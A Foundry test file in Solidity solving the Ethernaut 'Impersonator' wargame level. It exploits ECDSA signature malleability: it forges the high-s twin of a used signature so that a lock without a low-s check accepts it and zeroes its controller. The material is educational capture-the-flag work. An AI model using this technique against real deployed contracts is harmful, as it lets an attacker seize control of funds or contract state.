// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Impersonator, ECLocker} from "../src/levels/Impersonator.sol";

/// Ethernaut "Impersonator" → ECDSA signature malleability
/// (catalog: `signature-replay-malleability`).
///
/// `ECLocker` invalidates a signature by hashing (r,s,v) — both the constructor
/// (`keccak256(_signature)`, the r‖s‖v blob) and `_isValidSignature`
/// (`keccak256(abi.encode([r,s,v]))`) land on the SAME key, so the exact (v,r,s) can't be replayed.
/// BUT it uses raw `ecrecover` with no low-s check, so the malleable twin `(v^1, r, N−s)` recovers
/// the IDENTICAL signer and hashes to a DIFFERENT key — a second valid, unused signature for the same
/// message. `changeController(v', r, s', address(0))` then zeroes the controller.
///
/// Win: lockers(0).controller() == address(0).
contract ImpersonatorTest is Test {
    // secp256k1 group order — for the low-s/high-s malleability twin
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function test_solve_impersonator() public {
        // --- challenge setup: a lock is deployed for an initial controller via its signature ---
        uint256 controllerPk = 0xA11CE;
        address controller = vm.addr(controllerPk);

        Impersonator imp = new Impersonator(0); // first deployNewLock -> lockId == 1
        bytes32 msgHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", bytes32(uint256(1))));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(controllerPk, msgHash);
        // ECLocker reads the sig as r(32) ++ s(32) ++ v(full 32-byte word)
        imp.deployNewLock(abi.encodePacked(r, s, bytes32(uint256(v))));

        ECLocker lock = imp.lockers(0);
        assertEq(lock.controller(), controller, "initial controller set from signature");

        // The original (v,r,s) is already marked used. Forge the malleable twin: same signer.
        bytes32 s2 = bytes32(N - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;

        // The guard re-validates ecrecover(msgHash, v2, r, s2) == controller (true, no low-s check)
        // and the twin's keccak key is unused -> controller set to zero.
        lock.changeController(v2, r, s2, address(0));

        assertEq(lock.controller(), address(0), "controller zeroed via malleable signature twin");
    }
}
